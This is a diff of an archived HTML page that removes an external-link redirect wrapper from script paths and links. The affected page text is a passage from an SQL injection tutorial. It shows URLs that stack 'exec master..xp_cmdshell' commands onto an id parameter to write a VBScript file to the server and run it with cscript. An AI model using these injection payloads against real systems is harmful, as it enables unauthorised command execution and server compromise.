@@ -39,8 +39,8 @@
 	}
 	else	// Load Rest of YUI remotely (where possible)
 	{
-		var yuipath = '../external.html?link=http://yui.yahooapis.com/2.9.0/build';
-		var yuicombopath = '../external.html?link=http://yui.yahooapis.com/combo';
+		var yuipath = 'http://yui.yahooapis.com/2.9.0/build';
+		var yuicombopath = 'http://yui.yahooapis.com/combo';
 		var remoteyui = true;
 		if (!yuicombopath)
 		{
@@ -697,18 +697,18 @@ Dir.SetInfo<br/>
 This is done by using the xp_cmdshell in this fashion:<br/>
 <br/>
 Quote:<br/>
-<a href="../external.html?link=http://target/details.asp?id=1;exec+master..xp_cmdshell+%92echo" target="_blank">http://target/details.asp?id=1;exec+...cmdshell+’echo</a> ‘ Set WshShell =<br/>
+<a href="http://target/details.asp?id=1;exec+master..xp_cmdshell+%92echo" target="_blank">http://target/details.asp?id=1;exec+...cmdshell+’echo</a> ‘ Set WshShell =<br/>
 WScript.CreateObject(”WScript.Shell”) &gt; c:\secret.vbs’<br/>
 …..<br/>
 …..<br/>
 …..<br/>
-<a href="../external.html?link=http://target/details.asp?id=1;exec+master..xp_cmdshell+%92echo" target="_blank">http://target/details.asp?id=1;exec+...cmdshell+’echo</a> ‘ Dir.SetInfo<br/>
+<a href="http://target/details.asp?id=1;exec+master..xp_cmdshell+%92echo" target="_blank">http://target/details.asp?id=1;exec+...cmdshell+’echo</a> ‘ Dir.SetInfo<br/>
 &gt;&gt; c:\secret.vbs<br/>
 Once the file is complete, we use the xp_cmdshell to run the vbs script.<br/>
 <br/>
 Code:<br/>
 <br/>
-<a href="../external.html?link=http://target/details.asp?id=1;exec+master..xp_cmdshell+%92cscript+c:\secret.vbs%92" target="_blank">http://target/details.asp?id=1;exec+...c:\secret.vbs’</a><br/>
+<a href="http://target/details.asp?id=1;exec+master..xp_cmdshell+%92cscript+c:\secret.vbs%92" target="_blank">http://target/details.asp?id=1;exec+...c:\secret.vbs’</a><br/>
 <br/>
 And finally:<br/>
 <br/>
